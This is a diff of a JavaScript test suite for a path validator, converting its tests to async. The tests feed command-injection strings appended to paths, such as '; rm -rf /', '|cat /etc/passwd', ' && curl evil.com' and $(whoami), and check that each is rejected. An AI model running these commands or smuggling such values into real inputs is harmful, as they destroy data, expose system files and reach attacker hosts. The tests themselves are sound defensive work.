@@ -15,66 +15,64 @@ describe('Path Validation Security', () => {
     });
 
     describe('Shell metacharacter rejection', () => {
-        test('should reject paths with backticks', () => {
+        test('should reject paths with backticks', async () => {
             const maliciousPath = testRoot + '`whoami`';
-            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
+            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
         });
 
-        test('should reject paths with dollar signs', () => {
+        test('should reject paths with dollar signs', async () => {
             const maliciousPath = testRoot + '$(whoami)';
-            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
+            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
         });
 
-        test('should reject paths with pipes', () => {
+        test('should reject paths with pipes', async () => {
             const maliciousPath = testRoot + '|cat /etc/passwd';
-            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
+            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
         });
 
-        test('should reject paths with semicolons', () => {
+        test('should reject paths with semicolons', async () => {
             const maliciousPath = testRoot + '; rm -rf /';
-            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
+            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
         });
 
-        test('should reject paths with ampersands', () => {
+        test('should reject paths with ampersands', async () => {
             const maliciousPath = testRoot + ' && curl evil.com';
-            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
+            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
         });
 
-        test('should reject paths with redirects', () => {
+        test('should reject paths with redirects', async () => {
             const maliciousPath = testRoot + ' > /tmp/evil';
-            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
+            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
         });
 
-        test('should reject paths with null bytes', () => {
+        test('should reject paths with null bytes', async () => {
             const maliciousPath = testRoot + '\0';
-            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
+            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
         });
 
-        test('should reject paths with newlines', () => {
+        test('should reject paths with newlines', async () => {
             const maliciousPath = testRoot + '\nrm -rf /';
-            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
+            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
         });
 
-        test('should accept normal project paths', () => {
-            expect(() => validateRootDirectory(testRoot)).not.toThrow();
-            const validated = validateRootDirectory(testRoot);
+        test('should accept normal project paths', async () => {
+            const validated = await validateRootDirectory(testRoot);
             expect(validated).toBeTruthy();
         });
 
-        test('should accept paths with spaces, dashes, underscores', () => {
+        test('should accept paths with spaces, dashes, underscores', async () => {
             const validPath = join(testRoot, 'my-project_v2 (copy)');
             mkdirSync(validPath, { recursive: true });
 
-            expect(() => validateRootDirectory(validPath)).not.toThrow();
-            const validated = validateRootDirectory(validPath);
+            const validated = await validateRootDirectory(validPath);
             expect(validated).toBeTruthy();
         });
     });
 
     describe('Non-existent directory handling', () => {
-        test('should reject non-existent root directory', () => {
+        test('should reject non-existent root directory', async () => {
             const nonExistentPath = join(testRoot, 'does-not-exist-' + Date.now());
-            expect(() => validateRootDirectory(nonExistentPath)).toThrow('Root directory does not exist');
+            await expect(validateRootDirectory(nonExistentPath)).rejects.toThrow('Root directory does not exist');
         });
     });
 });
